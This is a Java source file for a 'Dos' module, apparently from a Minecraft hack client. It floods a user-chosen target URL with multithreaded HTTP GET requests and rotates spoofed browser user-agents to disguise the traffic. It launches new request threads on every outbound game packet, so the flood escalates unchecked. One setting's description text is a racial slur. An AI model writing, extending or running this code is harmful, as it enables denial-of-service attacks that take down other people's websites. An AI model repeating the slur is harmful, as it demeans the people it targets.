package net.shoreline.client.impl.module.exploit;

import net.minecraft.network.packet.c2s.common.CommonPongC2SPacket;
import net.shoreline.client.OvaqPlus;
import net.shoreline.client.api.config.Config;
import net.shoreline.client.api.config.setting.BooleanConfig;
import net.shoreline.client.api.config.setting.EnumConfig;
import net.shoreline.client.api.config.setting.NumberConfig;
import net.shoreline.client.api.config.setting.StringConfig;
import net.shoreline.client.api.event.listener.EventListener;
import net.shoreline.client.api.module.ModuleCategory;
import net.shoreline.client.api.module.ToggleModule;
import net.shoreline.client.impl.event.network.PacketEvent;
import net.shoreline.client.util.chat.ChatUtil;

import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Random;

public class DosModule extends ToggleModule {

    private static final String[] USER_AGENTS = {
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile Safari/604.1",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    };

    private static final Random RANDOM = new Random();

    Config<String> TargetConfig = new StringConfig("Target", "Target URL", "");
    Config<Float> threadConfig = new NumberConfig<>("Threads", "Number of threads", 1.0f, 5.0f, 20.0f);
    Config<Long> delayConfig = new NumberConfig<>("Delay", "Delay between requests (ms)", 1L, 100L, 100L);
    Config<Boolean> debugConfig = new BooleanConfig("Debug", "Nigga",false);

    public DosModule() {
        super("Dos", "Performs asynchronous HTTP GET flooding", ModuleCategory.EXPLOIT);
    }

    @EventListener
    public void onPacketOutbound(PacketEvent.Outbound event) {
        for (int i = 0; i < threadConfig.getValue(); i++) {
            new Thread(() -> {
                while (isEnabled()) {
                    try {
                        HttpURLConnection connection = (HttpURLConnection) new URL(TargetConfig.getValue()).openConnection();
                        connection.setRequestMethod("GET");
                        connection.setRequestProperty("User-Agent", USER_AGENTS[RANDOM.nextInt(USER_AGENTS.length)]);
                        int responseCode = connection.getResponseCode();

                        if (debugConfig.getValue()) {
                            ChatUtil.clientSendMessage("Response: " + responseCode);
                        }

                        connection.disconnect();
                    } catch (Exception e) {
                        if (debugConfig.getValue()) {
                            ChatUtil.clientSendMessage("Error: " + e.getMessage());
                        }
                    }

                    try {
                        Thread.sleep(delayConfig.getValue());
                    } catch (InterruptedException ignored) {
                    }
                }
            }).start();
        }
    }
}
